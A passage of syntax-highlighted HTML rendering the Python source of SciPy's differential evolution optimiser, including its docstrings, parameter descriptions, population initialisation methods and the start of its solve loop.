Rosenbrock function. This</span></span><br><span class="line"><span class="string">    function is implemented in `rosen` in `scipy.optimize`.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from scipy.optimize import rosen, differential_evolution</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; bounds = [(0,2), (0, 2), (0, 2), (0, 2), (0, 2)]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result = differential_evolution(rosen, bounds)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result.x, result.fun</span></span><br><span class="line"><span class="string">    (array([1., 1., 1., 1., 1.]), 1.9216496320061384e-19)</span></span><br><span class="line"><span class="string">    Next find the minimum of the Ackley function</span></span><br><span class="line"><span class="string">    (http://en.wikipedia.org/wiki/Test_functions_for_optimization).</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from scipy.optimize import differential_evolution</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; import numpy as np</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def ackley(x):</span></span><br><span class="line"><span class="string">    ...     arg1 = -0.2 * np.sqrt(0.5 * (x[0] ** 2 + x[1] ** 2))</span></span><br><span class="line"><span class="string">    ...     arg2 = 0.5 * (np.cos(2. * np.pi * x[0]) + np.cos(2. * np.pi * x[1]))</span></span><br><span class="line"><span class="string">    ...     return -20. * np.exp(arg1) - np.exp(arg2) + 20. + np.e</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; bounds = [(-5, 5), (-5, 5)]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result = differential_evolution(ackley, bounds)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result.x, result.fun</span></span><br><span class="line"><span class="string">    (array([ 0.,  0.]), 4.4408920985006262e-16)</span></span><br><span class="line"><span class="string">    References</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    .. [1] Storn, R and Price, K, Differential Evolution - a Simple and</span></span><br><span class="line"><span class="string">           Efficient Heuristic for Global Optimization over Continuous Spaces,</span></span><br><span class="line"><span class="string">           Journal of Global Optimization, 1997, 11, 341 - 359.</span></span><br><span class="line"><span class="string">    .. [2] http://www1.icsi.berkeley.edu/~storn/code.html</span></span><br><span class="line"><span class="string">    .. [3] http://en.wikipedia.org/wiki/Differential_evolution</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    solver = DifferentialEvolutionSolver(func, bounds, args=args,</span><br><span class="line">                                         strategy=strategy, maxiter=maxiter,</span><br><span class="line">                                         popsize=popsize, tol=tol,</span><br><span class="line">                                         mutation=mutation,</span><br><span class="line">                                         recombination=recombination,</span><br><span class="line">                                         seed=seed, polish=polish,</span><br><span class="line">                                         callback=callback,</span><br><span class="line">                                         disp=disp, init=init, atol=atol)</span><br><span class="line">    <span class="keyword">return</span> solver.solve()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DifferentialEvolutionSolver</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;This class implements the differential evolution solver</span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    func : callable</span></span><br><span class="line"><span class="string">        The objective function to be minimized.  Must be in the form</span></span><br><span class="line"><span class="string">        ``f(x, *args)``, where ``x`` is the argument in the form of a 1-D array</span></span><br><span class="line"><span class="string">        and ``args`` is a  tuple of any additional fixed parameters needed to</span></span><br><span class="line"><span class="string">        completely specify the function.</span></span><br><span class="line"><span class="string">    bounds : sequence</span></span><br><span class="line"><span class="string">        Bounds for variables.  ``(min, max)`` pairs for each element in ``x``,</span></span><br><span class="line"><span class="string">        defining the lower and upper bounds for the optimizing argument of</span></span><br><span class="line"><span class="string">        `func`. It is required to have ``len(bounds) == len(x)``.</span></span><br><span class="line"><span class="string">        ``len(bounds)`` is used to determine the number of parameters in ``x``.</span></span><br><span class="line"><span class="string">    args : tuple, optional</span></span><br><span class="line"><span class="string">        Any additional fixed parameters needed to</span></span><br><span class="line"><span class="string">        completely specify the objective function.</span></span><br><span class="line"><span class="string">    strategy : str, optional</span></span><br><span class="line"><span class="string">        The differential evolution strategy to use. Should be one of:</span></span><br><span class="line"><span class="string">            - &#x27;best1bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;best1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;randtobest1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;currenttobest1exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;best2exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand2exp&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;randtobest1bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;currenttobest1bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;best2bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand2bin&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;rand1bin&#x27;</span></span><br><span class="line"><span class="string">        The default is &#x27;best1bin&#x27;</span></span><br><span class="line"><span class="string">    maxiter : int, optional</span></span><br><span class="line"><span class="string">        The maximum number of generations over which the entire population is</span></span><br><span class="line"><span class="string">        evolved. The maximum number of function evaluations (with no polishing)</span></span><br><span class="line"><span class="string">        is: ``(maxiter + 1) * popsize * len(x)``</span></span><br><span class="line"><span class="string">    popsize : int, optional</span></span><br><span class="line"><span class="string">        A multiplier for setting the total population size.  The population has</span></span><br><span class="line"><span class="string">        ``popsize * len(x)`` individuals (unless the initial population is</span></span><br><span class="line"><span class="string">        supplied via the `init` keyword).</span></span><br><span class="line"><span class="string">    tol : float, optional</span></span><br><span class="line"><span class="string">        Relative tolerance for convergence, the solving stops when</span></span><br><span class="line"><span class="string">        ``np.std(pop) &lt;= atol + tol * np.abs(np.mean(population_energies))``,</span></span><br><span class="line"><span class="string">        where and `atol` and `tol` are the absolute and relative tolerance</span></span><br><span class="line"><span class="string">        respectively.</span></span><br><span class="line"><span class="string">    mutation : float or tuple(float, float), optional</span></span><br><span class="line"><span class="string">        The mutation constant. In the literature this is also known as</span></span><br><span class="line"><span class="string">        differential weight, being denoted by F.</span></span><br><span class="line"><span class="string">        If specified as a float it should be in the range [0, 2].</span></span><br><span class="line"><span class="string">        If specified as a tuple ``(min, max)`` dithering is employed. Dithering</span></span><br><span class="line"><span class="string">        randomly changes the mutation constant on a generation by generation</span></span><br><span class="line"><span class="string">        basis. The mutation constant for that generation is taken from</span></span><br><span class="line"><span class="string">        U[min, max). Dithering can help speed convergence significantly.</span></span><br><span class="line"><span class="string">        Increasing the mutation constant increases the search radius, but will</span></span><br><span class="line"><span class="string">        slow down convergence.</span></span><br><span class="line"><span class="string">    recombination : float, optional</span></span><br><span class="line"><span class="string">        The recombination constant, should be in the range [0, 1]. In the</span></span><br><span class="line"><span class="string">        literature this is also known as the crossover probability, being</span></span><br><span class="line"><span class="string">        denoted by CR. Increasing this value allows a larger number of mutants</span></span><br><span class="line"><span class="string">        to progress into the next generation, but at the risk of population</span></span><br><span class="line"><span class="string">        stability.</span></span><br><span class="line"><span class="string">    seed : int or `np.random.RandomState`, optional</span></span><br><span class="line"><span class="string">        If `seed` is not specified the `np.random.RandomState` singleton is</span></span><br><span class="line"><span class="string">        used.</span></span><br><span class="line"><span class="string">        If `seed` is an int, a new `np.random.RandomState` instance is used,</span></span><br><span class="line"><span class="string">        seeded with `seed`.</span></span><br><span class="line"><span class="string">        If `seed` is already a `np.random.RandomState` instance, then that</span></span><br><span class="line"><span class="string">        `np.random.RandomState` instance is used.</span></span><br><span class="line"><span class="string">        Specify `seed` for repeatable minimizations.</span></span><br><span class="line"><span class="string">    disp : bool, optional</span></span><br><span class="line"><span class="string">        Display status messages</span></span><br><span class="line"><span class="string">    callback : callable, `callback(xk, convergence=val)`, optional</span></span><br><span class="line"><span class="string">        A function to follow the progress of the minimization. ``xk`` is</span></span><br><span class="line"><span class="string">        the current value of ``x0``. ``val`` represents the fractional</span></span><br><span class="line"><span class="string">        value of the population convergence.  When ``val`` is greater than one</span></span><br><span class="line"><span class="string">        the function halts. If callback returns `True`, then the minimization</span></span><br><span class="line"><span class="string">        is halted (any polishing is still carried out).</span></span><br><span class="line"><span class="string">    polish : bool, optional</span></span><br><span class="line"><span class="string">        If True, then `scipy.optimize.minimize` with the `L-BFGS-B` method</span></span><br><span class="line"><span class="string">        is used to polish the best population member at the end. This requires</span></span><br><span class="line"><span class="string">        a few more function evaluations.</span></span><br><span class="line"><span class="string">    maxfun : int, optional</span></span><br><span class="line"><span class="string">        Set the maximum number of function evaluations. However, it probably</span></span><br><span class="line"><span class="string">        makes more sense to set `maxiter` instead.</span></span><br><span class="line"><span class="string">    init : str or array-like, optional</span></span><br><span class="line"><span class="string">        Specify which type of population initialization is performed. Should be</span></span><br><span class="line"><span class="string">        one of:</span></span><br><span class="line"><span class="string">            - &#x27;latinhypercube&#x27;</span></span><br><span class="line"><span class="string">            - &#x27;random&#x27;</span></span><br><span class="line"><span class="string">            - array specifying the initial population. The array should have</span></span><br><span class="line"><span class="string">              shape ``(M, len(x))``, where len(x) is the number of parameters.</span></span><br><span class="line"><span class="string">              `init` is clipped to `bounds` before use.</span></span><br><span class="line"><span class="string">        The default is &#x27;latinhypercube&#x27;. Latin Hypercube sampling tries to</span></span><br><span class="line"><span class="string">        maximize coverage of the available parameter space. &#x27;random&#x27;</span></span><br><span class="line"><span class="string">        initializes the population randomly - this has the drawback that</span></span><br><span class="line"><span class="string">        clustering can occur, preventing the whole of parameter space being</span></span><br><span class="line"><span class="string">        covered. Use of an array to specify a population could be used, for</span></span><br><span class="line"><span class="string">        example, to create a tight bunch of initial guesses in an location</span></span><br><span class="line"><span class="string">        where the solution is known to exist, thereby reducing time for</span></span><br><span class="line"><span class="string">        convergence.</span></span><br><span class="line"><span class="string">    atol : float, optional</span></span><br><span class="line"><span class="string">        Absolute tolerance for convergence, the solving stops when</span></span><br><span class="line"><span class="string">        ``np.std(pop) &lt;= atol + tol * np.abs(np.mean(population_energies))``,</span></span><br><span class="line"><span class="string">        where and `atol` and `tol` are the absolute and relative tolerance</span></span><br><span class="line"><span class="string">        respectively.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Dispatch of mutation strategy method (binomial or exponential).</span></span><br><span class="line">    _binomial = &#123;<span class="string">&#x27;best1bin&#x27;</span>: <span class="string">&#x27;_best1&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;randtobest1bin&#x27;</span>: <span class="string">&#x27;_randtobest1&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;currenttobest1bin&#x27;</span>: <span class="string">&#x27;_currenttobest1&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;best2bin&#x27;</span>: <span class="string">&#x27;_best2&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;rand2bin&#x27;</span>: <span class="string">&#x27;_rand2&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;rand1bin&#x27;</span>: <span class="string">&#x27;_rand1&#x27;</span>&#125;</span><br><span class="line">    _exponential = &#123;<span class="string">&#x27;best1exp&#x27;</span>: <span class="string">&#x27;_best1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;rand1exp&#x27;</span>: <span class="string">&#x27;_rand1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;randtobest1exp&#x27;</span>: <span class="string">&#x27;_randtobest1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;currenttobest1exp&#x27;</span>: <span class="string">&#x27;_currenttobest1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;best2exp&#x27;</span>: <span class="string">&#x27;_best2&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;rand2exp&#x27;</span>: <span class="string">&#x27;_rand2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    __init_error_msg = (<span class="string">&quot;The population initialization method must be one of &quot;</span></span><br><span class="line">                        <span class="string">&quot;&#x27;latinhypercube&#x27; or &#x27;random&#x27;, or an array of shape &quot;</span></span><br><span class="line">                        <span class="string">&quot;(M, N) where N is the number of parameters and M&gt;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, func, bounds, args=(<span class="params"></span>),</span></span></span><br><span class="line"><span class="function"><span class="params">                 strategy=<span class="string">&#x27;best1bin&#x27;</span>, maxiter=<span class="number">1000</span>, popsize=<span class="number">15</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 tol=<span class="number">0.01</span>, mutation=(<span class="params"><span class="number">0.5</span>, <span class="number">1</span></span>), recombination=<span class="number">0.7</span>, seed=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 maxfun=np.inf, callback=<span class="literal">None</span>, disp=<span class="literal">False</span>, polish=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 init=<span class="string">&#x27;latinhypercube&#x27;</span>, atol=<span class="number">0</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> strategy <span class="keyword">in</span> self._binomial:</span><br><span class="line">            self.mutation_func = <span class="built_in">getattr</span>(self, self._binomial[strategy])</span><br><span class="line">        <span class="keyword">elif</span> strategy <span class="keyword">in</span> self._exponential:</span><br><span class="line">            self.mutation_func = <span class="built_in">getattr</span>(self, self._exponential[strategy])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Please select a valid mutation strategy&quot;</span>)</span><br><span class="line">        self.strategy = strategy</span><br><span class="line"></span><br><span class="line">        self.callback = callback</span><br><span class="line">        self.polish = polish</span><br><span class="line"></span><br><span class="line">        <span class="comment"># relative and absolute tolerances for convergence</span></span><br><span class="line">        self.tol, self.atol = tol, atol</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Mutation constant should be in [0, 2). If specified as a sequence</span></span><br><span class="line">        <span class="comment"># then dithering is performed.</span></span><br><span class="line">        self.scale = mutation</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> np.<span class="built_in">all</span>(np.isfinite(mutation)) <span class="keyword">or</span></span><br><span class="line">                np.<span class="built_in">any</span>(np.array(mutation) &gt;= <span class="number">2</span>) <span class="keyword">or</span></span><br><span class="line">                np.<span class="built_in">any</span>(np.array(mutation) &lt; <span class="number">0</span>)):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;The mutation constant must be a float in &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;U[0, 2), or specified as a tuple(min, max)&#x27;</span></span><br><span class="line">                             <span class="string">&#x27; where min &lt; max and min, max are in U[0, 2).&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.dither = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(mutation, <span class="string">&#x27;__iter__&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(mutation) &gt; <span class="number">1</span>:</span><br><span class="line">            self.dither = [mutation[<span class="number">0</span>], mutation[<span class="number">1</span>]]</span><br><span class="line">            self.dither.sort()</span><br><span class="line"></span><br><span class="line">        self.cross_over_probability = recombination</span><br><span class="line"></span><br><span class="line">        self.func = func</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">        <span class="comment"># convert tuple of lower and upper bounds to limits</span></span><br><span class="line">        <span class="comment"># [(low_0, high_0), ..., (low_n, high_n]</span></span><br><span class="line">        <span class="comment">#     -&gt; [[low_0, ..., low_n], [high_0, ..., high_n]]</span></span><br><span class="line">        self.limits = np.array(bounds, dtype=<span class="string">&#x27;float&#x27;</span>).T</span><br><span class="line">        <span class="keyword">if</span> (np.size(self.limits, <span class="number">0</span>) != <span class="number">2</span> <span class="keyword">or</span> <span class="keyword">not</span></span><br><span class="line">                np.<span class="built_in">all</span>(np.isfinite(self.limits))):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;bounds should be a sequence containing &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;real valued (min, max) pairs for each value&#x27;</span></span><br><span class="line">                             <span class="string">&#x27; in x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> maxiter <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># the default used to be None</span></span><br><span class="line">            maxiter = <span class="number">1000</span></span><br><span class="line">        self.maxiter = maxiter</span><br><span class="line">        <span class="keyword">if</span> maxfun <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># the default used to be None</span></span><br><span class="line">            maxfun = np.inf</span><br><span class="line">        self.maxfun = maxfun</span><br><span class="line"></span><br><span class="line">        <span class="comment"># population is scaled to between [0, 1].</span></span><br><span class="line">        <span class="comment"># We have to scale between parameter &lt;-&gt; population</span></span><br><span class="line">        <span class="comment"># save these arguments for _scale_parameter and</span></span><br><span class="line">        <span class="comment"># _unscale_parameter. This is an optimization</span></span><br><span class="line">        self.__scale_arg1 = <span class="number">0.5</span> * (self.limits[<span class="number">0</span>] + self.limits[<span class="number">1</span>])</span><br><span class="line">        self.__scale_arg2 = np.fabs(self.limits[<span class="number">0</span>] - self.limits[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        self.parameter_count = np.size(self.limits, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.random_number_generator = check_random_state(seed)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># default population initialization is a latin hypercube design, but</span></span><br><span class="line">        <span class="comment"># there are other population initializations possible.</span></span><br><span class="line">        <span class="comment"># the minimum is 5 because &#x27;best2bin&#x27; requires a population that&#x27;s at</span></span><br><span class="line">        <span class="comment"># least 5 long</span></span><br><span class="line">        self.num_population_members = <span class="built_in">max</span>(<span class="number">5</span>, popsize * self.parameter_count)</span><br><span class="line"></span><br><span class="line">        self.population_shape = (self.num_population_members,</span><br><span class="line">                                 self.parameter_count)</span><br><span class="line"></span><br><span class="line">        self._nfev = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(init, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">if</span> init == <span class="string">&#x27;latinhypercube&#x27;</span>:</span><br><span class="line">                self.init_population_lhs()</span><br><span class="line">            <span class="keyword">elif</span> init == <span class="string">&#x27;random&#x27;</span>:</span><br><span class="line">                self.init_population_random()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(self.__init_error_msg)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.init_population_array(init)</span><br><span class="line"></span><br><span class="line">        self.disp = disp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_population_lhs</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initializes the population with Latin Hypercube Sampling.</span></span><br><span class="line"><span class="string">        Latin Hypercube Sampling ensures that each parameter is uniformly</span></span><br><span class="line"><span class="string">        sampled over its range.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        rng = self.random_number_generator</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Each parameter range needs to be sampled uniformly. The scaled</span></span><br><span class="line">        <span class="comment"># parameter range ([0, 1)) needs to be split into</span></span><br><span class="line">        <span class="comment"># `self.num_population_members` segments, each of which has the following</span></span><br><span class="line">        <span class="comment"># size:</span></span><br><span class="line">        segsize = <span class="number">1.0</span> / self.num_population_members</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Within each segment we sample from a uniform random distribution.</span></span><br><span class="line">        <span class="comment"># We need to do this sampling for each parameter.</span></span><br><span class="line">        samples = (segsize * rng.random_sample(self.population_shape)</span><br><span class="line"></span><br><span class="line">                   <span class="comment"># Offset each segment to cover the entire parameter range [0, 1)</span></span><br><span class="line">                   + np.linspace(<span class="number">0.</span>, <span class="number">1.</span>, self.num_population_members,</span><br><span class="line">                                 endpoint=<span class="literal">False</span>)[:, np.newaxis])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create an array for population of candidate solutions.</span></span><br><span class="line">        self.population = np.zeros_like(samples)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Initialize population of candidate solutions by permutation of the</span></span><br><span class="line">        <span class="comment"># random samples.</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.parameter_count):</span><br><span class="line">            order = rng.permutation(<span class="built_in">range</span>(self.num_population_members))</span><br><span class="line">            self.population[:, j] = samples[order, j]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reset population energies</span></span><br><span class="line">        self.population_energies = (np.ones(self.num_population_members) *</span><br><span class="line">                                    np.inf)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reset number of function evaluations counter</span></span><br><span class="line">        self._nfev = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_population_random</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialises the population at random.  This type of initialization</span></span><br><span class="line"><span class="string">        can possess clustering, Latin Hypercube sampling is generally better.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        rng = self.random_number_generator</span><br><span class="line">        self.population = rng.random_sample(self.population_shape)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reset population energies</span></span><br><span class="line">        self.population_energies = (np.ones(self.num_population_members) *</span><br><span class="line">                                    np.inf)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reset number of function evaluations counter</span></span><br><span class="line">        self._nfev = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_population_array</span>(<span class="params">self, init</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialises the population with a user specified population.</span></span><br><span class="line"><span class="string">        Parameters</span></span><br><span class="line"><span class="string">        ----------</span></span><br><span class="line"><span class="string">        init : np.ndarray</span></span><br><span class="line"><span class="string">            Array specifying subset of the initial population. The array should</span></span><br><span class="line"><span class="string">            have shape (M, len(x)), where len(x) is the number of parameters.</span></span><br><span class="line"><span class="string">            The population is clipped to the lower and upper `bounds`.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># make sure you&#x27;re using a float array</span></span><br><span class="line">        popn = np.asfarray(init)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (np.size(popn, <span class="number">0</span>) &lt; <span class="number">5</span> <span class="keyword">or</span></span><br><span class="line">                popn.shape[<span class="number">1</span>] != self.parameter_count <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">len</span>(popn.shape) != <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;The population supplied needs to have shape&quot;</span></span><br><span class="line">                             <span class="string">&quot; (M, len(x)), where M &gt; 4.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># scale values and clip to bounds, assigning to population</span></span><br><span class="line">        self.population = np.clip(self._unscale_parameters(popn), <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.num_population_members = np.size(self.population, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        self.population_shape = (self.num_population_members,</span><br><span class="line">                                 self.parameter_count)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reset population energies</span></span><br><span class="line">        self.population_energies = (np.ones(self.num_population_members) *</span><br><span class="line">                                    np.inf)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reset number of function evaluations counter</span></span><br><span class="line">        self._nfev = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">x</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        The best solution from the solver</span></span><br><span class="line"><span class="string">        Returns</span></span><br><span class="line"><span class="string">        -------</span></span><br><span class="line"><span class="string">        x : ndarray</span></span><br><span class="line"><span class="string">            The best solution from the solver.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self._scale_parameters(self.population[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convergence</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        The standard deviation of the population energies divided by their</span></span><br><span class="line"><span class="string">        mean.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (np.std(self.population_energies) /</span><br><span class="line">                np.<span class="built_in">abs</span>(np.mean(self.population_energies) + _MACHEPS))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Runs the DifferentialEvolutionSolver.</span></span><br><span class="line"><span class="string">        Returns</span></span><br><span class="line"><span class="string">        -------</span></span><br><span class="line"><span class="string">        res : OptimizeResult</span></span><br><span class="line"><span class="string">            The optimization result represented as a ``OptimizeResult`` object.</span></span><br><span class="line"><span class="string">            Important attributes are: ``x`` the solution array, ``success`` a</span></span><br><span class="line"><span class="string">            Boolean flag indicating if the optimizer exited successfully and</span></span><br><span class="line"><span class="string">            ``message`` which describes the cause of the termination. See</span></span><br><span class="line"><span class="string">            `OptimizeResult` for a description of other attributes.  If `polish`</span></span><br><span class="line"><span class="string">            was employed, and a lower minimum was obtained by the polishing,</span></span><br><span class="line"><span class="string">            then OptimizeResult also contains the ``jac`` attribute.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        nit, warning_flag = <span class="number">0</span>, <span class="literal">False</span></span><br><span class="line">        status_message = _status_message[<span class="string">&#x27;success&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># The population may have just been initialized (all entries are</span></span><br><span class="line">        <span class="comment"># np.inf). If it has you have to calculate the initial energies.</span></span><br><span class="line">        <span class="comment"># Although this is also done in the evolve generator it&#x27;s possible</span></span><br><span class="line">        <span class="comment"># that someone can set maxiter=0, at which point we still want the</span></span><br><span class="line">        <span class="comment"># initial energies to be calculated (the following loop isn&#x27;t run).</span></span><br><span class="line">        <span class="keyword">if</span> np.<span class="built_in">all</span>(np.isinf(self.population_energies)):</span><br><span class="line">            self._calculate_population_energies()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># do the optimisation.</span></span><br><span class="line">        <span class="keyword">for</span> nit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.maxiter + <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># evolve the population by a generation</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">next</span>(self)</span><br><span class="line">            <span class="keyword">except</span> StopIteration:</span><br><span class="line">                warning_flag = <span class="literal">True</span></span><br><span class="line">                status_message = _status_message[<span class="string">&#x27;maxfev&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.disp:</span><br><span class="line">                print(<span class="string">&quot;differential_evolution step %d: f(x)= %g&quot;</span></span><br><span class="line">                      % (nit,</span><br><span class="line">                         self.population_energies[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># should the solver terminate?</span></span><br><span class="line">            convergence = self.convergence</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (self.callback <span class="keyword">and</span></span><br><span class="line">                    self.callback(self._scale_parameters(self.population[<span class="number">0</span>]),</span><br><span class="line">                                  convergence=self.tol / convergence) <span class="keyword">is</span> <span class="literal">True</span>):</span><br><span class="line"></span><br><span class="line">                warning_flag = <span class="literal">True</span></span><br><span class="line">                status_message = (<span class="string">&#x27;callback function requested stop early &#x27;</span></span><br><span class="line">                                  <span class="string">&#x27;by returning True&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            intol = (np.std(self.population_energies) &lt;=</span><br><span class="line">                     self.atol +</span><br><span class="line">                     self.tol * np.<span class="built_in">abs</span>(np.mean(self.population_energies)))</span><br><span class="line">            <span class="keyword">if</span> warning_flag <span class="keyword">or</span> intol:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status_message = _status_message[<span class="string">&#x27;maxiter&#x27;</span>]</span><br><span class="line">            warning_flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        DE_result = OptimizeResult(</span><br><span class="line">            x=self.x,</span><br><span class="line">            fun=self.population_energies[<span class="number">0</span>],</span><br><span class="line">            nfev=self._nfev,</span><br><span class="line">            nit=nit,</span><br><span class="line">            message=status_message,</span><br><span class="line">            success=(warning_flag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.polish:</span><br><span class="line">            result = minimize(self.func,</span><br><span class="line">                              np.copy(DE_result.x),</span><br><span class="line">                              method=<span class="string">&#x27;L-BFGS-B&#x27;</span>,</span><br><span class="line">                              